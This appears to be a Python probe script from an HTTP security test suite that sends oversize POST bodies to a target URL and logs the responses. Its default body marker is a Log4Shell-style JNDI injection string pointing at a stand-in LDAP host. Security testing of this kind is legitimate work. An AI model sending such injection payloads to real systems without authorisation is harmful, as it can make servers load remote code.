#!/usr/bin/env python3
from __future__ import annotations

import argparse
from pathlib import Path

from http_probe_common import curl_request, dump_json, ensure_dir, write_csv


def build_body(target_size: int, marker: str) -> str:
    if target_size <= len(marker):
        return marker[:target_size]
    pad = "A" * (target_size - len(marker))
    return marker + pad


def write_text(path: Path, text: str) -> None:
    path.write_text(text, encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser(description="Run TC-12 oversize body probes.")
    parser.add_argument("--url", required=True)
    parser.add_argument("--output-dir", required=True)
    parser.add_argument("--method", default="POST")
    parser.add_argument("--content-type", default="application/json")
    parser.add_argument("--sizes", default="128,4096,16384,65536", help="Comma-separated body sizes in bytes")
    parser.add_argument("--marker", default='{"q":"${jndi:ldap://probe.invalid/tc12}"}')
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    out_dir = ensure_dir(args.output_dir)
    sizes = [int(item.strip()) for item in args.sizes.split(",") if item.strip()]

    rows: list[dict[str, str]] = []
    summary = {"url": args.url, "content_type": args.content_type, "cases": []}
    for size in sizes:
        name = f"body_{size}"
        body = build_body(size, args.marker)
        body_path = out_dir / f"{name}.payload"
        write_text(body_path, body)
        result = curl_request(
            url=args.url,
            out_prefix=out_dir / name,
            method=args.method,
            headers=[f"Content-Type: {args.content_type}"],
            body_path=body_path,
            timeout=args.timeout,
        )
        metadata = {"case": name, "target_size": size, "payload_path": str(body_path), "result": result}
        dump_json(out_dir / f"{name}.meta.json", metadata)
        summary["cases"].append(metadata)
        rows.append(
            {
                "case": name,
                "target_size": str(size),
                "http_code": result["http_code"],
                "server_header": result["server_header"],
                "content_type": result["content_type"],
                "body_fingerprint": result["body_fingerprint"],
                "header_path": result["header_path"],
                "body_path": result["body_path"],
                "payload_path": str(body_path),
            }
        )

    dump_json(out_dir / "summary.json", summary)
    write_csv(
        out_dir / "summary.csv",
        ["case", "target_size", "http_code", "server_header", "content_type", "body_fingerprint", "header_path", "body_path", "payload_path"],
        rows,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
